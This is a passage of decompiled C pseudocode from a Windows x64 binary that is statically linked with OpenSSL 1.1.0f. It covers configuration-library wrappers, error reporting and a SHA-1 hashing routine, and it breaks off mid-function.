    || !(unsigned int)sub_14005C5B0((__int64)v8, v10, 0x14ui64) )
  {
    return 0i64;
  }
  sub_140023440((__int64)v10, 20i64);
  return 1i64;
}
// 14005B800: using guessed type unsigned int var_40[6];

//----- (000000014005B960) ----------------------------------------------------
__int64 __fastcall sub_14005B960(__int64 a1)
{
  _DWORD *v1; // rax

  v1 = (_DWORD *)sub_14001C740(a1);
  return sub_14001EE20(v1);
}

//----- (000000014005B980) ----------------------------------------------------
__int64 __fastcall sub_14005B980(__int64 a1)
{
  _DWORD *v1; // rax

  v1 = (_DWORD *)sub_14001C740(a1);
  return sub_14001F1B0(v1);
}

//----- (000000014005B9A0) ----------------------------------------------------
__int64 __fastcall sub_14005B9A0(__int64 a1, unsigned int *a2, size_t a3)
{
  __int64 v5; // rax

  v5 = sub_14001C740(a1);
  return sub_14001F220(v5, a2, a3);
}

//----- (000000014005B9E0) ----------------------------------------------------
__int64 __fastcall sub_14005B9E0(__int64 a1, _BYTE *a2)
{
  __int64 v3; // rax

  v3 = sub_14001C740(a1);
  return sub_14001EE90(a2, v3);
}

//----- (000000014005BA10) ----------------------------------------------------
__int64 __fastcall sub_14005BA10(__int64 a1)
{
  __int64 v1; // rax

  v1 = sub_14001C740(a1);
  return sub_140042360(v1);
}

//----- (000000014005BA30) ----------------------------------------------------
__int64 __fastcall sub_14005BA30(__int64 a1)
{
  __int64 v1; // rax

  v1 = sub_14001C740(a1);
  return sub_140042980(v1);
}

//----- (000000014005BA50) ----------------------------------------------------
__int64 __fastcall sub_14005BA50(__int64 a1, char *a2, size_t a3)
{
  __int64 v5; // rax

  v5 = sub_14001C740(a1);
  return sub_140042A10(v5, a2, a3);
}

//----- (000000014005BA90) ----------------------------------------------------
__int64 __fastcall sub_14005BA90(__int64 a1, _BYTE *a2)
{
  __int64 v3; // rax

  v3 = sub_14001C740(a1);
  return sub_1400423F0(a2, v3);
}

//----- (000000014005BAC0) ----------------------------------------------------
void *sub_14005BAC0()
{
  return &unk_1400FADF0;
}

//----- (000000014005BAD0) ----------------------------------------------------
void *sub_14005BAD0()
{
  return &unk_1400FAE40;
}

//----- (000000014005BAE0) ----------------------------------------------------
void *sub_14005BAE0()
{
  return &unk_1400FAE90;
}

//----- (000000014005BAF0) ----------------------------------------------------
void *sub_14005BAF0()
{
  return &unk_1400FAEE0;
}

//----- (000000014005BB00) ----------------------------------------------------
void *sub_14005BB00()
{
  return &unk_1400FAF30;
}

//----- (000000014005BB10) ----------------------------------------------------
__int64 __fastcall sub_14005BB10(__int64 a1)
{
  __int64 v1; // rax

  v1 = sub_14001C740(a1);
  return sub_14009DBC0(v1);
}

//----- (000000014005BB30) ----------------------------------------------------
__int64 __fastcall sub_14005BB30(__int64 a1, unsigned __int8 *a2, size_t a3)
{
  unsigned __int8 *v5; // rax

  v5 = (unsigned __int8 *)sub_14001C740(a1);
  return sub_14009DBF0(v5, a2, a3);
}

//----- (000000014005BB70) ----------------------------------------------------
__int64 __fastcall sub_14005BB70(__int64 a1, _QWORD *a2)
{
  unsigned int *v3; // rax

  v3 = (unsigned int *)sub_14001C740(a1);
  return sub_14009DB40(a2, v3);
}

//----- (000000014005BBA0) ----------------------------------------------------
void *sub_14005BBA0()
{
  return &unk_1400FAF80;
}

//----- (000000014005BBB0) ----------------------------------------------------
__int64 __fastcall sub_14005BBB0(__int64 a1, unsigned __int8 *a2, size_t a3)
{
  __int64 v5; // rax

  v5 = sub_14001C740(a1);
  return sub_14009E040(v5, a2, a3);
}

//----- (000000014005BBF0) ----------------------------------------------------
__int64 __fastcall sub_14005BBF0(__int64 a1, __int64 a2)
{
  int *v3; // rax

  v3 = (int *)sub_14001C740(a1);
  return sub_14009DEB0(a2, v3);
}

//----- (000000014005BC20) ----------------------------------------------------
void *sub_14005BC20()
{
  return &unk_1400FAFD0;
}

//----- (000000014005BC30) ----------------------------------------------------
__int64 __fastcall sub_14005BC30(__int64 a1)
{
  void *v1; // rax

  v1 = (void *)sub_14001C740(a1);
  return sub_14009FD60(v1);
}

//----- (000000014005BC50) ----------------------------------------------------
__int64 __fastcall sub_14005BC50(__int64 a1, char *a2, unsigned __int64 a3)
{
  __int64 v5; // rax

  v5 = sub_14001C740(a1);
  return sub_14009FD90(v5, a2, a3);
}

//----- (000000014005BC90) ----------------------------------------------------
__int64 __fastcall sub_14005BC90(__int64 a1, _OWORD *a2)
{
  __int64 v3; // rax

  v3 = sub_14001C740(a1);
  return sub_14009FC00(a2, v3);
}

//----- (000000014005BCC0) ----------------------------------------------------
void *sub_14005BCC0()
{
  return &unk_1400FB020;
}

//----- (000000014005BCD0) ----------------------------------------------------
_BOOL8 sub_14005BCD0()
{
  sub_1400A0010();
  sub_1400A0240();
  sub_1400A0820();
  return sub_1400A0660();
}

//----- (000000014005BD00) ----------------------------------------------------
__int64 sub_14005BD00()
{
  return sub_14001E0C0(30208i64, 0i64);
}
// 140003C30: using guessed type __int64 __fastcall guard_check_icall_nop();
// 14001E0C0: using guessed type __int64 __fastcall sub_14001E0C0(_QWORD, _QWORD);

//----- (000000014005BD30) ----------------------------------------------------
__int64 __fastcall sub_14005BD30(__int64 a1)
{
  char **v1; // rax
  __int64 v4[5]; // [rsp+20h] [rbp-28h] BYREF

  v1 = (char **)qword_140143388;
  if ( !qword_140143388 )
  {
    v1 = sub_1400A17D0();
    qword_140143388 = (__int64)v1;
  }
  ((void (__fastcall *)(__int64 *))v1[2])(v4);
  v4[2] = a1;
  return (*(__int64 (__fastcall **)(__int64 *))(v4[0] + 32))(v4);
}
// 140143388: using guessed type __int64 qword_140143388;

//----- (000000014005BD80) ----------------------------------------------------
__int64 __fastcall sub_14005BD80(__int64 a1, __int64 a2)
{
  char **v4; // rax
  char v6[16]; // [rsp+30h] [rbp-28h] BYREF
  __int64 v7; // [rsp+40h] [rbp-18h]

  if ( !a1 )
    return 0i64;
  v4 = (char **)qword_140143388;
  if ( !qword_140143388 )
  {
    v4 = sub_1400A17D0();
    qword_140143388 = (__int64)v4;
  }
  ((void (__fastcall *)(char *))v4[2])(v6);
  v7 = a1;
  if ( !a2 )
  {
    sub_140024610(14, 108, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_lib.c", 252);
    return 0i64;
  }
  return sub_1400A1FC0((__int64)v6, a2);
}
// 140143388: using guessed type __int64 qword_140143388;

//----- (000000014005BE10) ----------------------------------------------------
__int64 __fastcall sub_14005BE10(__int64 a1, const char *a2, char *a3)
{
  __int64 result; // rax
  char **v7; // rax
  char v8[16]; // [rsp+30h] [rbp-28h] BYREF
  __int64 v9; // [rsp+40h] [rbp-18h]

  if ( a1 )
  {
    v7 = (char **)qword_140143388;
    if ( !qword_140143388 )
    {
      v7 = sub_1400A17D0();
      qword_140143388 = (__int64)v7;
    }
    ((void (__fastcall *)(char *))v7[2])(v8);
    v9 = a1;
    return sub_14005C010((__int64)v8, a2, a3);
  }
  else
  {
    result = sub_1400A2010(0i64, a2, a3);
    if ( !result )
    {
      sub_140024610(14, 109, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_lib.c", 272);
      return 0i64;
    }
  }
  return result;
}
// 140143388: using guessed type __int64 qword_140143388;

//----- (000000014005BEC0) ----------------------------------------------------
__int64 __fastcall sub_14005BEC0(__int64 a1)
{
  __int64 result; // rax

  if ( a1 )
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 24i64))(a1);
  return result;
}

//----- (000000014005BEE0) ----------------------------------------------------
__int64 __fastcall sub_14005BEE0(__int64 a1, const char *a2, char *a3, _DWORD *a4)
{
  int v4; // eax
  __int64 result; // rax
  unsigned __int8 *v8; // rdi
  int v9; // eax

  if ( a4 )
  {
    result = sub_14005C010(a1, a2, a3);
    v8 = (unsigned __int8 *)result;
    if ( result )
    {
      *a4 = 0;
      if ( (*(unsigned int (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 56i64))(a1, *(unsigned __int8 *)result) )
      {
        do
        {
          v9 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 64i64))(a1, *v8++);
          *a4 = v9 + 10 * *a4;
        }
        while ( (*(unsigned int (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 56i64))(a1, *v8) );
      }
      return 1i64;
    }
  }
  else
  {
    sub_140024610(v4 - 34, v4 + 64, v4 + 19, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_lib.c", 286);
    return 0i64;
  }
  return result;
}
// 14005BF10: variable 'v4' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014005BFA0) ----------------------------------------------------
__int64 __fastcall sub_14005BFA0(__int64 a1, __int64 a2)
{
  int v2; // eax

  if ( a1 )
  {
    if ( a2 )
    {
      return sub_1400A1FC0(a1, a2);
    }
    else
    {
      sub_140024610(14, 108, 107, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_lib.c", 252);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(v2 - 42, v2 + 52, v2 + 49, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_lib.c", 247);
    return 0i64;
  }
}
// 14005BFC8: variable 'v2' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014005C010) ----------------------------------------------------
__int64 __fastcall sub_14005C010(__int64 a1, const char *a2, char *a3)
{
  __int64 result; // rax

  result = sub_1400A2010(a1, a2, a3);
  if ( !result )
  {
    if ( a1 )
    {
      sub_140024610(14, 109, 108, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_lib.c", 275);
      sub_140023A40(4, "group=", a2, " name=", a3);
    }
    else
    {
      sub_140024610(14, 109, 106, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_lib.c", 272);
    }
    return 0i64;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014005C0C0) ----------------------------------------------------
__int64 __fastcall sub_14005C0C0(__int64 a1)
{
  int v1; // eax

  if ( a1 )
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 72i64))(a1);
  sub_140024610(v1 - 42, v1 + 57, v1 + 49, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_lib.c", 212);
  return 0i64;
}
// 14005C0E8: variable 'v1' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014005C110) ----------------------------------------------------
__int64 __fastcall sub_14005C110(char **a1)
{
  char **v1; // rax
  __int64 result; // rax

  v1 = a1;
  if ( !a1 )
    v1 = sub_1400A17D0();
  result = ((__int64 (__fastcall *)(char **))v1[1])(v1);
  if ( !result )
  {
    sub_140024610(14, 111, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_lib.c", 188);
    return 0i64;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014005C160) ----------------------------------------------------
const char *sub_14005C160()
{
  return "D:\\opensource\\openssl-dist-1.1.0f-vs2017\\openssl-x64-static-release-vs2017\\ssl";
}

//----- (000000014005C170) ----------------------------------------------------
int sub_14005C170()
{
  __int64 v0; // rax
  _QWORD *v1; // rbx

  v0 = sub_14002F7E0();
  v1 = (_QWORD *)v0;
  if ( v0 && *(_QWORD *)v0 && *(_DWORD *)(v0 + 8) )
  {
    LODWORD(v0) = ConvertFiberToThread();
    *v1 = 0i64;
  }
  return v0;
}

//----- (000000014005C1B0) ----------------------------------------------------
__int64 __fastcall sub_14005C1B0(__int64 a1, unsigned int a2)
{
  unsigned int (__fastcall *v2)(__int64, __int64 *, _QWORD, _QWORD); // rax
  __int64 v4; // [rsp+40h] [rbp+8h] BYREF

  v2 = *(unsigned int (__fastcall **)(__int64, __int64 *, _QWORD, _QWORD))(a1 + 64);
  if ( v2 && v2(a1, &v4, 0i64, a2) )
    return v4;
  sub_140024610(38, 186, 147, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\tb_digest.c", 74);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014005C210) ----------------------------------------------------
__int64 __fastcall sub_14005C210(int a1)
{
  return sub_1400417E0(&qword_140143390, a1);
}
// 140143390: using guessed type __int64 qword_140143390;

//----- (000000014005C230) ----------------------------------------------------
__int64 __fastcall sub_14005C230(__int64 a1)
{
  __int64 (__fastcall *v1)(__int64, _QWORD, int **, _QWORD); // rax
  int v3; // eax
  int *v5; // [rsp+40h] [rbp+8h] BYREF

  v1 = *(__int64 (__fastcall **)(__int64, _QWORD, int **, _QWORD))(a1 + 64);
  if ( v1 && (v3 = v1(a1, 0i64, &v5, 0i64), v3 > 0) )
    return sub_140041620(&qword_140143390, (__int64)sub_14005C320, a1, v5, v3, 0);
  else
    return 1i64;
}
// 140143390: using guessed type __int64 qword_140143390;

//----- (000000014005C2A0) ----------------------------------------------------
__int64 __fastcall sub_14005C2A0(__int64 a1)
{
  __int64 (__fastcall *v1)(__int64, _QWORD, int **, _QWORD); // rax
  int v3; // eax
  int *v5; // [rsp+40h] [rbp+8h] BYREF

  v1 = *(__int64 (__fastcall **)(__int64, _QWORD, int **, _QWORD))(a1 + 64);
  if ( v1 && (v3 = v1(a1, 0i64, &v5, 0i64), v3 > 0) )
    return sub_140041620(&qword_140143390, (__int64)sub_14005C320, a1, v5, v3, 1);
  else
    return 1i64;
}
// 140143390: using guessed type __int64 qword_140143390;

//----- (000000014005C310) ----------------------------------------------------
__int64 __fastcall sub_14005C310(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 64) = a2;
  return 1i64;
}

//----- (000000014005C320) ----------------------------------------------------
__int64 sub_14005C320()
{
  return sub_140041580(&qword_140143390);
}
// 140143390: using guessed type __int64 qword_140143390;

//----- (000000014005C340) ----------------------------------------------------
void __fastcall sub_14005C340(void *a1)
{
  sub_14001D930(a1);
}

//----- (000000014005C360) ----------------------------------------------------
_DWORD *__fastcall sub_14005C360(int a1, int a2, int a3)
{
  int v3; // eax
  _DWORD *result; // rax

  result = sub_14001DC20((unsigned int)(v3 + 56));
  if ( result )
  {
    *result = a1;
    result[1] = a2;
    result[2] = a3;
  }
  return result;
}
// 14005C38A: variable 'v3' is possibly undefined

//----- (000000014005C3B0) ----------------------------------------------------
__int64 __fastcall sub_14005C3B0(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 16) = a2;
  return 1i64;
}

//----- (000000014005C3C0) ----------------------------------------------------
__int64 __fastcall sub_14005C3C0(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 48) = a2;
  return 1i64;
}

//----- (000000014005C3D0) ----------------------------------------------------
__int64 __fastcall sub_14005C3D0(_BYTE *a1, int *a2)
{
  __int64 v2; // rbx
  __int64 v3; // rsi
  unsigned __int64 v6; // rbx
  int v7; // ecx
  int v8; // ecx
  int v9; // ecx
  int v10; // ecx
  int v11; // edx
  __int64 result; // rax

  v2 = (unsigned int)a2[23];
  v3 = (__int64)(a2 + 7);
  *((_BYTE *)a2 + v2 + 28) = 0x80;
  v6 = v2 + 1;
  if ( v6 > 0x38 )
  {
    memset((void *)(v6 + v3), 0, 64 - v6);
    v6 = 0i64;
    sub_14005C6E0(a2, (unsigned int *)v3, 1i64);
  }
  memset((void *)(v6 + v3), 0, 56 - v6);
  *(_BYTE *)(v3 + 56) = *((_BYTE *)a2 + 27);
  *(_BYTE *)(v3 + 57) = *((_BYTE *)a2 + 26);
  *(_BYTE *)(v3 + 58) = *((_BYTE *)a2 + 25);
  *(_BYTE *)(v3 + 59) = *((_BYTE *)a2 + 24);
  *(_BYTE *)(v3 + 60) = *((_BYTE *)a2 + 23);
  *(_BYTE *)(v3 + 61) = *((_BYTE *)a2 + 22);
  *(_BYTE *)(v3 + 62) = *((_BYTE *)a2 + 21);
  *(_BYTE *)(v3 + 63) = *((_BYTE *)a2 + 20);
  sub_14005C6E0(a2, (unsigned int *)v3, 1i64);
  a2[23] = 0;
  sub_140023440(v3, 64i64);
  v7 = *a2;
  *a1 = HIBYTE(*a2);
  a1[1] = BYTE2(v7);
  a1[2] = BYTE1(v7);
  a1[3] = v7;
  v8 = a2[1];
  a1[4] = HIBYTE(v8);
  a1[5] = BYTE2(v8);
  a1[6] = BYTE1(v8);
  a1[7] = v8;
  v9 = a2[2];
  a1[8] = HIBYTE(v9);
  a1[9] = BYTE2(v9);
  a1[10] = BYTE1(v9);
  a1[11] = v9;
  v10 = a2[3];
  a1[12] = HIBYTE(v10);
  a1[13] = BYTE2(v10);
  a1[14] = BYTE1(v10);
  a1[15] = v10;
  v11 = a2[4];
  a1[16] = HIBYTE(v11);
  a1[17] = BYTE2(v11);
  result = 1i64;
  a1[18] = BYTE1(v11);
  a1[19] = v11;
  return result;
}

//----- (000000014005C560) ----------------------------------------------------
__int64 __fastcall sub_14005C560(_DWORD *a1)
{
  int v1; // eax
  __int64 result; // rax

  memset(a1, 0, (unsigned int)(v1 + 64));
  result = 1i64;
  *a1 = 1732584193;
  a1[1] = -271733879;
  a1[2] = -1732584194;
  a1[3] = 271733878;
  a1[4] = -1009589776;
  return result;
}
// 14005C571: variable 'v1' is possibly undefined

//----- (000000014005C5B0) ----------------------------------------------------
__int64 __fastcall sub_14005C5B0(__int64 a1, unsigned int *a2, size_t a3)
{
  size_t v3; // rdi
  unsigned int *v4; // rbp
  unsigned int v6; // eax
  unsigned int v7; // ecx
  __int64 v8; // rcx
  _QWORD *v9; // r14
  __int64 v10; // rbx
  size_t v11; // rbx

  v3 = a3;
  v4 = a2;
  if ( a3 )
  {
    v6 = *(_DWORD *)(a1 + 20);
    v7 = v6 + 8 * a3;
    if ( v7 < v6 )
      ++*(_DWORD *)(a1 + 24);
    *(_DWORD *)(a1 + 20) = v7;
    v8 = *(unsigned int *)(a1 + 92);
    *(_DWORD *)(a1 + 24) += a3 >> 29;
    if ( v8 )
    {
      v9 = (_QWORD *)(a1 + 28);
      if ( a3 < 0x40 && v8 + a3 < 0x40 )
      {
        memmove((char *)v9 + v8, a2, a3);
        *(_DWORD *)(a1 + 92) += v3;
        return 1i64;
      }
      v10 = 64 - v8;
      memmove((char *)v9 + v8, a2, 64 - v8);
      sub_14005C6E0((_DWORD *)a1, (unsigned int *)(a1 + 28), 1i64);
      *(_DWORD *)(a1 + 92) = 0;
      v4 = (unsigned int *)((char *)v4 + v10);
      v3 -= v10;
      *v9 = 0i64;
      *(_QWORD *)(a1 + 36) = 0i64;
      *(_QWORD *)(a1 + 44) = 0i64;
      *(_QWORD *)(a1 + 52) = 0i64;
      *(_QWORD *)(a1 + 60) = 0i64;
      *(_QWORD *)(a1 + 68) = 0i64;
      *(_QWORD *)(a1 + 76) = 0i64;
      *(_QWORD *)(a1 + 84) = 0i64;
    }
    if ( v3 >> 6 )
    {
      sub_14005C6E0((_DWORD *)a1, v4, v3 >> 6);
      v11 = v3 >> 6 << 6;
      v4 = (unsigned int *)((char *)v4 + v11);
      v3 -= v11;
    }
    if ( v3 )
    {
      *(_DWORD *)(a1 + 92) = v3;
      memmove((void *)(a1 + 28), v4, v3);
    }
  }
  return 1i64;
}

//----- (000000014005C6E0) ----------------------------------------------------
__int64 __fastcall sub_14005C6E0(_DWORD *a1, unsigned int *a2, __int64 a3)
{
  __int64 result; // rax
  unsigned int v5; // r11d
  unsigned int v6; // r8d
  unsigned int v7; // ebx
  int v8; // esi
  int v9; // ebp
  int v10; // edx
  int v11; // ebp
  int v12; // r8d
  int v13; // edx
  int v14; // esi
  int v15; // r9d
  int v16; // edx
  int v17; // r8d
  int v18; // r10d
  int v19; // edx
  int v20; // r9d
  int v21; // r11d
  int v22; // edx
  int v23; // r10d
  int v24; // r11d
  int v25; // ebx
  int v26; // edx
  int v27; // r11d
  int v28; // edi
  int v29; // esi
  int v30; // ebx
  int v31; // edx
  int v32; // edi
  int v33; // ecx
  int v34; // ebp
  int v35; // esi
  int v36; // r10d
  int v37; // edx
  int v38; // ecx
  int v39; // r10d
  int v40; // ebp
  int v41; // r8d
  int v42; // edx
  int v43; // ebp
  int v44; // ecx
  int v45; // ebx
  int v46; // r8d
  int v47; // r9d
  int v48; // edx
  int v49; // ecx
  int v50; // r9d
  int v51; // ebx
  int v52; // r11d
  int v53; // r10d
  int v54; // ebx
  int v55; // r10d
  int v56; // edx
  int v57; // r11d
  int v58; // r8d
  int v59; // edx
  int v60; // r10d
  int v61; // edi
  int v62; // ecx
  int v63; // r8d
  int v64; // r9d
  int v65; // edx
  int v66; // edi
  int v67; // r9d
  int v68; // r11d
  int v69; // ebx
  int v70; // edi
  int v71; // edx
  int v72; // r11d
  int v73; // ebp
  int v74; // r12d
  int v75; // r8d
  int v76; // r14d
  int v77; // r15d
  int v78; // edx
  int v79; // ebx
  int v80; // r8d
  int v81; // ecx
  int v82; // r10d
  int v83; // r8d
  int v84; // r9d
  int v85; // ecx
  int v86; // edx
  int v87; // r9d
  int v88; // r10d
  int v89; // edi
  int v90; // r11d
  int v91; // edx
  int v92; // r10d
  int v93; // ebx
  int v94; // esi
  int v95; // r8d
  int v96; // r11d
  int v97; // r13d
  int v98; // r8d
  int v99; // edx
  int v100; // ebx
  int v101; // r9d
  int v102; // edx
  int v103; // r8d
  int v104; // r10d
  int v105; // edx
  int v106; // r9d
  int v107; // r11d
  int v108; // edx
  int v109; // r10d
  int v110; // ebx
  int v111; // r8d
  int v112; // r11d
  int v113; // r8d
  int v114; // edx
  int v115; // ebx
  int v116; // r9d
  int v117; // edx
  int v118; // r8d
  int v119; // r10d
  int v120; // edx
  int v121; // r9d
  int v122; // r11d
  int v123; // edx
  int v124; // r10d
  int v125; // ebx
  int v126; // edx
  int v127; // r11d
  int v128; // r8d
  int v129; // edx
  int v130; // ebx
  int v131; // ecx
  int v132; // r12d
  int v133; // r9d
  int v134; // edx
  int v135; // r8d
  int v136; // r10d
  int v137; // edx
  int v138; // r9d
  int v139; // r11d
  int v140; // ebx
  int v141; // r14d
  int v142; // r10d
  int v143; // edx
  int v144; // r11d
  int v145; // ecx
  int v146; // edi
  int v147; // edx
  int v148; // ebx
  int v149; // edx
  int v150; // r15d
  int v151; // ecx
  int v152; // r13d
  int v153; // r9d
  int v154; // edx
  int v155; // ecx
  int v156; // edi
  int v157; // r10d
  int v158; // edx
  int v159; // r9d
  int v160; // r11d
  int v161; // edx
  int v162; // r10d
  int v163; // ecx
  int v164; // ebx
  int v165; // edx
  int v166; // r11d
  int v167; // edi
  int v168; // edx
  int v169; // ebx
  int v170; // r9d
  int v171; // edx
  int v172; // edi
  int v173; // r10d
  int v174; // edx
  int v175; // r9d
  int v176; // r11d
  int v177; // ebp
  int v178; // r13d
  int v179; // edx
  int v180; // r10d
  int v181; // ebx
  int v182; // edx
  int v183; // r11d
  int v184; // ecx
  int v185; // edi
  int v186; // edx
  int v187; // ebx
  int v188; // r9d
  int v189; // r10d
  int v190; // r15d
  int v191; // r13d
  int v192; // edi
  int v193; // edx
  int v194; // r9d
  int v195; // r11d
  int v196; // ecx
  int v197; // edx
  int v198; // r10d
  int v199; // ebx
  int v200; // edx
  int v201; // ecx
  int v202; // r11d
  int v203; // esi
  int v204; // edi
  int v205; // ebx
  int v206; // r9d
  int v207; // edx
  int v208; // esi
  int v209; // ecx
  int v210; // r10d
  int v211; // edx
  int v212; // edi
  int v213; // edx
  int v214; // ecx
  int v215; // r11d
  int v216; // edx
  int v217; // r10d
  int v218; // ebx
  int v219; // edx
  int v220; // r11d
  int v221; // r9d
  int v222; // ecx
  int v223; // ebx
  int v224; // r8d
  int v225; // ecx
  int v226; // r9d
  int v227; // r12d
  int v228; // r10d
  int v229; // ecx
  int v230; // r8d
  int v231; // r11d
  int v232; // ecx
  int v233; // r10d
  int v234; // ebx
  int v235; // ecx
  int v236; // r11d
  int v237; // r9d
  int v238; // ecx
  int v239; // esi
  int v240; // ebx
  int v241; // r13d
  int v242; // esi
  int v243; // r8d
  int v244; // ecx
  int v245; // r9d
  int v246; // r14d
  int v247; // r10d
  int v248; // r13d
  int v249; // ecx
  int v250; // r8d
  int v251; // r11d
  int v252; // ecx
  int v253; // r10d
  int v254; // ebx
  int v255; // ecx
  int v256; // r11d
  int v257; // r9d
  int v258; // ecx
  int v259; // ebx
  int v260; // edi
  int v261; // r12d
  int v262; // r8d
  int v263; // ecx
  int v264; // r9d
  int v265; // ebp
  int v266; // ecx
  int v267; // edi
  int v268; // r15d
  int v269; // ecx
  int v270; // ebp
  int v271; // r11d
  int v272; // r14d
  int v273; // ecx
  int v274; // r15d
  int v275; // ebx
  int v276; // esi
  int v277; // r9d
  int v278; // edi
  int v279; // r14d
  int v280; // r10d
  int v281; // ecx
  int v282; // esi
  int v283; // r11d
  int v284; // edx
  int v285; // edi
  int v286; // ebx
  int v287; // edx
  int v288; // r11d
  int v289; // r9d
  int v290; // ecx
  bool v291; // zf
  unsigned int v292; // [rsp+0h] [rbp-98h]
  int v293; // [rsp+0h] [rbp-98h]
  int v294; // [rsp+0h] [rbp-98h]
  int v295; // [rsp+0h] [rbp-98h]
  unsigned int v296; // [rsp+4h] [rbp-94h]
  int v297; // [rsp+4h] [rbp-94h]
  int v298; // [rsp+4h] [rbp-94h]
  int v299; // [rsp+4h] [rbp-94h]
  unsigned int v300; // [rsp+8h] [rbp-90h]
  int v301; // [rsp+8h] [rbp-90h]
  int v302; // [rsp+8h] [rbp-90h]
  int v303; // [rsp+8h] [rbp-90h]
  unsigned int v304; // [rsp+Ch] [rbp-8Ch]
  int v305; // [rsp+Ch] [rbp-8Ch]
  int v306; // [rsp+Ch] [rbp-8Ch]
  int v307; // [rsp+Ch] [rbp-8Ch]
  unsigned int v308; // [rsp+10h] [rbp-88h]
  int v309; // [rsp+10h] [rbp-88h]
  int v310; // [rsp+10h] [rbp-88h]
  int v311; // [rsp+10h] [rbp-88h]
  int v312; // [rsp+14h] [rbp-84h]
  int v313; // [rsp+14h] [rbp-84h]
  int v314; // [rsp+14h] [rbp-84h]
  unsigned int v315; // [rsp+18h] [rbp-80h]
  int v316; // [rsp+18h] [rbp-80h]
  int v317; // [rsp+18h] [rbp-80h]
  int v318; // [rsp+18h] [rbp-80h]
  unsigned int v319; // [rsp+1Ch] [rbp-7Ch]
  int v320; // [rsp+1Ch] [rbp-7Ch]
  int v321; // [rsp+1Ch] [rbp-7Ch]
  unsigned int v322; // [rsp+20h] [rbp-78h]
  int v323; // [rsp+20h] [rbp-78h]
  int v324; // [rsp+20h] [rbp-78h]
  unsigned int v325; // [rsp+24h] [rbp-74h]
  int v326; // [rsp+24h] [rbp-74h]
  int v327; // [rsp+24h] [rbp-74h]
  unsigned int v328; // [rsp+28h] [rbp-70h]
  int v329; // [rsp+28h] [rbp-70h]
  int v330; // [rsp+28h] [rbp-70h]
  int v331; // [rsp+2Ch] [rbp-6Ch]
  int v332; // [rsp+2Ch] [rbp-6Ch]
  unsigned int v333; // [rsp+30h] [rbp-68h]
  int v334; // [rsp+30h] [rbp-68h]
  int v335; // [rsp+34h] [rbp-64h]
  int v336; // [rsp+34h] [rbp-64h]
  int v337; // [rsp+34h] [rbp-64h]
  unsigned int v338; // [rsp+38h] [rbp-60h]
  int v339; // [rsp+38h] [rbp-60h]
  int v340; // [rsp+38h] [rbp-60h]
  unsigned int v341; // [rsp+3Ch] [rbp-5Ch]
  int v342; // [rsp+3Ch] [rbp-5Ch]
  int v343; // [rsp+3Ch] [rbp-5Ch]
  unsigned int v344; // [rsp+40h] [rbp-58h]
  int v345; // [rsp+40h] [rbp-58h]
  int v346; // [rsp+40h] [rbp-58h]
  unsigned int v347; // [rsp+44h] [rbp-54h]
  int v348; // [rsp+44h] [rbp-54h]
  int v349; // [rsp+44h] [rbp-54h]
  unsigned __int64 i; // [rsp+48h] [rbp-50h]
  unsigned int *v352; // [rsp+A8h] [rbp+10h]
  unsigned int v354; // [rsp+B8h] [rbp+20h]
  int v355; // [rsp+B8h] [rbp+20h]
  int v356; // [rsp+B8h] [rbp+20h]
  int v357; // [rsp+B8h] [rbp+20h]

  result = (unsigned int)a1[2];
  v5 = a1[3];
  v6 = a1[4];
  v7 = a1[2];
  v8 = *a1;
  v9 = a1[1];
  for ( i = __PAIR64__(v6, v5); ; v5 = i )
  {
    v10 = v5 ^ v9 & (v7 ^ v5);
    v11 = __ROL4__(v9, 30);
    v347 = _byteswap_ulong(*a2);
    v338 = _byteswap_ulong(a2[1]);
    v12 = v347 + __ROL4__(v8, 5) + v10 + v6 + 1518500249;
    v13 = v8 & (v11 ^ v7);
    v14 = __ROL4__(v8, 30);
    v328 = _byteswap_ulong(a2[2]);
    v15 = v338 + __ROL4__(v12, 5) + (v7 ^ v13) + v5 + 1518500249;
    v16 = v12 & (v14 ^ v11);
    v17 = __ROL4__(v12, 30);
    v344 = _byteswap_ulong(a2[3]);
    v18 = v328 + __ROL4__(v15, 5) + (v11 ^ v16) + v7 + 1518500249;
    v19 = v14 ^ v15 & (v14 ^ v17);
    v20 = __ROL4__(v15, 30);
    v325 = _byteswap_ulong(a2[4]);
    v21 = v19 + 1518500249 + __ROL4__(v18, 5) + v344;
    v22 = v17 ^ v18 & (v20 ^ v17);
    v23 = __ROL4__(v18, 30);
    v24 = v11 + v21;
    v341 = _byteswap_ulong(a2[5]);
    v25 = v14 + v22 + 1518500249 + __ROL4__(v24, 5) + v325;
    v26 = v24 & (v23 ^ v20);
